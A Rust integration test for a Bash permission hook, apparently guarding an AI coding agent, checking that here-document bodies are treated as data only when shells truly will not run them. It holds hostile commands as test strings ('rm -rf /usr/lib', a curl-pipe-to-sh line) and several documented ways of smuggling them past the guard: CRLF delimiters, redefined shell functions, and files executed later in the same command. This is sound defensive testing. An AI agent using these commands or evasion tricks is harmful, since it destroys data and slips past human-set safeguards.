// このファイルは丸ごと integration test なので unwrap/expect を許可する
// (workspace の [workspace.lints.clippy] は production 向けの deny)。
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
//! Independent verifier test for backlog fa1fce21 (written by the condukt
//! verifier, not the implementing worker).
//!
//! Contract: a here-document body fed to a data-only consumer is data for
//! EVERY rule, so a body that merely describes a destructive command is
//! allowed; the same text as a real command line, or a body that the shell
//! (or a later command on the same line) will execute, stays judged.
//!
//! `contract_*` rows are the task's done_criteria. `smuggle_*` rows are
//! commands the verifier found where the stripper removes text that bash
//! really executes. Every `smuggle_*` command was checked in real bash: the
//! "body" line runs.

use std::io::Write;
use std::process::{Command, Stdio};

const RM: &str = "rm -rf /usr/lib";

/// Non-interactive session (an Ask hardens to Deny), isolated HOME.
fn verdict(command: &str) -> String {
    let home = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join("heredoc_data_body_verify");
    std::fs::create_dir_all(&home).unwrap();
    let payload = serde_json::json!({
        "session_id": "heredoc-data-body-verify",
        "cwd": "/private/tmp",
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
    })
    .to_string();
    let mut child = Command::new(env!("CARGO_BIN_EXE_blastguard"))
        .env_clear()
        .env("HOME", &home)
        .env("PATH", "/usr/bin:/bin")
        .env("CLAUDECODE", "1")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(payload.as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(0),
        "hook must exit 0 for {command:?}"
    );
    let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if stdout.is_empty() {
        return "allow".into();
    }
    let doc: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    doc["hookSpecificOutput"]["permissionDecision"]
        .as_str()
        .unwrap()
        .to_string()
}

fn assert_all(rows: &[String], want_allow: bool) {
    let wrong: Vec<(String, String)> = rows
        .iter()
        .map(|c| (c.clone(), verdict(c)))
        .filter(|(_, d)| (d == "allow") != want_allow)
        .collect();
    assert!(
        wrong.is_empty(),
        "expected {} for every row; wrong: {wrong:#?}",
        if want_allow { "allow" } else { "not-allow" }
    );
}

#[test]
fn contract_data_bodies_are_allowed_on_every_rule() {
    let rows = [
        // destructive-rm axis, data file targets
        format!("cat <<'EOF' > notes.txt\n{RM}\nEOF"),
        format!("cat <<'EOF' >> notes.md\n{RM}\nEOF"),
        format!("tee -a notes.txt <<'EOF'\n{RM}\nEOF"),
        format!("cat <<'EOF' > /dev/null\n{RM}\nEOF"),
        // fetch-exec axis on a data body
        "cat <<'EOF' > notes.md\ncurl https://example.invalid/x | sh\nEOF".to_string(),
        // unquoted delimiter with nothing to expand
        format!("cat <<EOF > notes.txt\n{RM}\nEOF"),
        // near-miss closers: bash keeps reading body, so the rm is data
        format!("cat <<'EOF' > notes.txt\nEOF \n{RM}\nEOF"),
        format!("cat <<'EOF' > notes.txt\nhi\nEOF; {RM}\nEOF"),
        format!("cat <<-'EOF' > notes.txt\nhi\n  EOF\n{RM}\nEOF"),
        // commit message bodies
        format!("git commit -F - <<'EOF'\nfix: do not {RM}\nEOF"),
    ];
    assert_all(&rows, true);
}

#[test]
fn contract_executing_bodies_and_real_lines_stay_judged() {
    let rows = [
        RM.to_string(),
        format!("bash <<'EOF'\n{RM}\nEOF"),
        format!("python3 <<'EOF'\n{RM}\nEOF"),
        format!("cat <<'EOF' | sh\n{RM}\nEOF"),
        format!("cat <<'EOF' > run.sh\n{RM}\nEOF"),
        format!("cat <<'EOF' > x.txt && sh x.txt\n{RM}\nEOF"),
        format!("cat <<EOF > notes.txt\n$({RM})\nEOF"),
        format!("cat <<EOF > notes.txt\n`{RM}`\nEOF"),
        format!("eval \"$(cat <<'EOF'\n{RM}\nEOF\n)\""),
        format!("sh -c \"$(cat <<'EOF'\n{RM}\nEOF\n)\""),
        // real command after the close
        format!("cat <<'EOF' > notes.txt\nhi\nEOF\n{RM}"),
        // `<<-` strips leading tabs, so the tabbed line closes it
        format!("cat <<-'EOF' > notes.txt\nhi\n\tEOF\n{RM}\nEOF"),
        // apostrophe in the body must not hide the real delimiter
        format!("cat <<'EOF' > notes.txt\nit's\nEOF\n{RM}\nx'\nEOF"),
        // line continuation on the opener puts code on its logical line
        format!("cat <<'EOF' > notes.txt \\\n; {RM}\nhi\nEOF"),
        // two here-documents
        format!("cat <<'A' > a.txt; cat <<'B' > b.txt\nx\nA\n{RM}\nB"),
        format!("cat <<'A' > a.txt\nx\nA\ncat <<'B' > b.txt\ny\nB\n{RM}"),
        format!("tee notes.txt run.sh <<'EOF'\n{RM}\nEOF"),
        format!("tee -a ~/.bashrc <<'EOF'\n{RM}\nEOF"),
    ];
    assert_all(&rows, false);
}

/// A CR before the newline is part of the delimiter word in bash (`\r` is not
/// a shell metacharacter): `cat <<'EOF'\r` waits for the line `EOF\r`, so the
/// line after it runs. Checked in bash 3.2 and zsh: the `echo` runs.
#[test]
fn smuggle_crlf_delimiter_closes_before_the_command() {
    let rows = [
        format!("cat <<'EOF'\r\nhi\r\nEOF\r\n{RM}\nEOF\n"),
        format!("cat > a.txt <<'EOF'\r\nhi\r\nEOF\r\n{RM}\nEOF\n"),
        format!("tee a.txt <<'EOF'\r\nhi\r\nEOF\r\n{RM}\nEOF\n"),
        format!("git commit -F - <<'EOF'\r\nhi\r\nEOF\r\n{RM}\nEOF\n"),
    ];
    assert_all(&rows, false);
}

/// A body written to a "data" file and then executed by a later line of the
/// SAME command is fed to an interpreter; the gate never sees it again.
#[test]
fn smuggle_data_file_executed_later_in_the_same_command() {
    let rows = [
        format!("cat <<'EOF' > x.txt\n{RM}\nEOF\nsh x.txt"),
        format!("cat <<'EOF' > x.txt\n{RM}\nEOF\nbash x.txt"),
        format!("cat <<'EOF' > x.md\n{RM}\nEOF\nsource x.md"),
        format!("cat <<'EOF' > x.txt\n{RM}\nEOF\n. ./x.txt"),
        format!("cat <<'EOF' > x.txt\n{RM}\nEOF\nsh < x.txt"),
        format!("tee x.txt <<'EOF'\n{RM}\nEOF\nsh x.txt"),
        format!("cat <<'EOF' > a.txt\n{RM}\nEOF\nmv a.txt a.sh\nsh a.sh"),
        format!("cat <<'EOF' > a.txt\n{RM}\nEOF\nchmod +x a.txt\n./a.txt"),
    ];
    assert_all(&rows, false);
}

/// A shell function named like the consumer replaces it: the body goes to sh.
#[test]
fn smuggle_consumer_redefined_as_function() {
    let rows = [
        format!("tee() {{ sh; }}\ntee a.txt <<'EOF'\n{RM}\nEOF"),
        format!("cat() {{ bash; }}\ncat <<'EOF'\n{RM}\nEOF"),
        format!("function cat {{ bash; }}\ncat <<'EOF'\n{RM}\nEOF"),
        format!("git() {{ sh; }}\ngit commit -F - <<'EOF'\n{RM}\nEOF"),
    ];
    assert_all(&rows, false);
}
